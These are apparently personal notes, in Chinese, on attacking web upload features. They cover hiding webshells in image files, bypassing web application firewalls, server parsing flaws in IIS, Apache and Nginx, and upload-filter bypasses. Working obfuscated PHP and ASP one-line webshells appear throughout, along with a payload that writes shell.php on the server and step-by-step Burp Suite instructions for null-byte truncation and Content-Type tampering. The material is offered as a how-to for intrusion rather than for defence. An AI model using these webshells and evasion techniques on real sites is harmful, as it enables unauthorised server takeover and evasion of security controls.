

*********************图片木马的制作*************************

在图片里写入木马
直接记事本编辑修改会导致图片无法使用，下面有三种方法

1.使用C32编辑图片，在任意位置植入即可
2.使用cmd终端输入    copy /b 1.png + 1.txt 2.png  （注意：图片在前，文本在后）
3.win7图片右键属性->详细信息->版权内插入	（注意：隐蔽性不好）

一般先上传小马后上传大马


*********************过WAF的方法*************************


1.使用包含语句绕过WAF

如php的包含语句：
<!--#include file="c.png"-->  			#保存为c.asp
然后上传这个c.asp和一个图片木马c.png		#植入木马：<%execute(request("c"))%>

原理:
c.png图片木马有恶意代码，但是图片不会被检测，也不能解析
c.php可以被解析，但是没有恶意代码，可以通过检测
因此两个结合可以欺骗防火墙从而绕过去




2.使用拆解隐藏木马
http://www.cnblogs.com/demonxian3/articles/6854160.html

如php的过狗一句话

$jg16 = base64_decode;
$z = $jg16(YXNzZXJ0);
$z($_POST[q]);

原理：木马加密以及关键字拆解，躲避正则等规则匹配

先讲php，需要用到三个函数
str_replace();  //字符拆解，如str_replace("a","x","abc") 结果：xbc
base64_encode();//加密
base64_decode();//解密

主要思路就是把不过狗的一句话<?php assert($_POST["q"]);?> 把assert($_POST["q"]);?>给base64加密然后插入随便字符，然后用str_replace（）替换，绕来绕去还是替换成assert($_POST["q"]);?> 的base64加密，然后在解密，就可以。

其实说白了，一句话永远不可能杀完，因为$_POST是个正常的提交方式，不可能被杀。然后其他assert或者eval一般也不会被杀，因为很多程序员要用到。狗只是针对特征杀，比如某个一句话用的人多了就会被杀。



如asp的过狗一句话

<%
dim a,b,temp,c
a="eva@@l%20req@@uest%28%22helloxj%22%29"
b=replace(a,"@@","零")
c=split(b,"零")
for i=0 to ubound(c)
temp=temp+c(i)
next
execute(unescape(temp))
%>


***********************解析漏洞*************************

常见的web服务器组件 IIS Apache Nginx

1.IIS 5.x/6.0

1)目录名解析漏洞：如果有个目录名字为xxx.asp，那么该目录下的文件
不管后缀名字是什么(比如/xxx.asp/1.jpg)，都可以被看成asp脚本来解析

2)分号名解析漏洞：如果有个文件名字为xxx.asp;.jpg，IIS会忽略分号以后
的名字格式，所以这个文件不会被当做jpg图片，而是当做xxx.asp脚本解析

3)IIS默认的可执行文件除了.asp外，还有xxx.asa  xxx.cer  xxx.cdx




2.Apache

1）后缀识别漏洞：Apache 是从右到左判断其文件格式，如果可以识别则停止进行解析
如果识别不了，继续向左判断，因此 xxx.php.ccc 文件会被看成成 xxx.php 来解析

2）htaccess文件漏洞：如果在Apache中.htaccess可执行且可上传，可以尝试在.htaccess中写入：
<FilesMatch "shell.jpg">SetHandler  application/x-httpd-php</FilesMatch>
然后再上传shell.jpg木马，这样就可以被解析成php


3.IIS 7.0/7.5 

1）畸形解析漏洞：在默认Fast-CGI开启的情况下，如果上传一个文件c.jpg里面的内容为
<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
的文件，然后访问c.jpg/.php 于是就会在该目录下生成一句话木马shell.php 
即： www.xxx.com/c.jpg/*.php 触发漏洞（会把前面的文件c.jpg当做php执行）


4.Nginx < 8.03
影响版： 0.5,0.6,0.7 <=0.7.65, 0.8<=0.8.37
1）空字节代码执行漏洞：Nginx在图片中嵌入php代码然后通过访问
xxx.jpg%00.php   %00是一种url编码其显示出来就是一个框框，可以截断
后面的字符串，从而成功上传php文件


***********************文件上传漏洞*************************

1.上传文件名：
(1)上传的文件名没有被更改，还是原来的文件名。
(2)上传的文件名被更改了，可能在名字上添加时间日期随机数等

---------------------------------------------------------
2.文件头欺骗：
(1)将编写好的一句话木马txt文件改名成图片格式的jpg或gif文件
(2)在一句话木马前面加上GIF89a 表示这是一个图片文件。

---------------------------------------------------------
3.图片大小
如果一句话图片木马太小了，应该多写入一些东西来伪造和图片一样大小的图片

---------------------------------------------------------
4.filepath漏洞
(1)搭建一个asp网站，打开burpsuit
(2)上传图片之前，开启抓包，然后上传抓包
(3)然后找到图片请求数据包，转到repeader上进行修改
(4)找到类似filepath字段，假设字段的值为/upfile/，可以修改成

/upfile/x.asp/

这样如果有权限的话，x.asp目录就会被创建，加上IIS6.0的
目录名解析漏洞，就可以将图片木马解析成asp脚本使用

如果没有权限创建目录，可以使用IIS6.0的分号名解析漏洞
/upfile/x.asp;.jpg

---------------------------------------------------------
5.%00截断漏洞
(1)搭建一个php网站，可以搭建DVWA，用burpsuit的repeader改包
(2)找到类似filename字段，假如字段值为 c.jpg 将其改成：
c.php jpg
(3)使用repeader里的HEX，找到空格的位置即 20 将其改成 00即可

(2)或者将c.jgp改名成c.php%00jpg 
(3)然后选中%00右键Convert selection选urlencode编码即可

(4)然后就可以上传了

---------------------------------------------------------
6.Content-type漏洞
(1)搭建一个asp网站，使用burpsuit的repeader改包
(2)上传一个图片木马，抓到对应的包转到repeader进行修改
(3)一般图片的Content-type格式为 image/jpeg
(4)将其改成 text/asp即可
(5)然后在00截断一下名字 c.jpg => c.asp%00jpg 基本可以绕过

---------------------------------------------------------
7.如果有选择文件按钮，但没有提交按钮。
可以自己写一个提交按钮就搞定了





*********************PHP代码学习*************************
str_replace()		字符替换函数
assert()		代码解析函数 类似eval()	但功能更强

